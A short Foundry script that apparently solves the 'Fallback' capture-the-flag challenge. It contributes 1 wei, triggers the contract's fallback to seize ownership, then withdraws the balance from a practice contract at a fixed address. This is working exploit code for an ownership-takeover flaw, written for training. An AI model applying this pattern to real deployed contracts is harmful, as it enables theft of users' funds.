// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    Fallback public contractInstance = Fallback(payable(0x2D07B9B69e496BB3CC93E8df29dcbE1806836a29));
    function setUp() public {}
    function run() public {
        uint256 userPrivateKey = vm.envUint("PRIVATE_KEY"); 
        vm.startBroadcast(userPrivateKey);
        contractInstance.contribute{value: 1 wei}();
        (bool success,) = address(contractInstance).call{value: 1 wei}("");
        require(success, "Fallback failed");
        contractInstance.withdraw();
        
        vm.stopBroadcast(); 
    }
}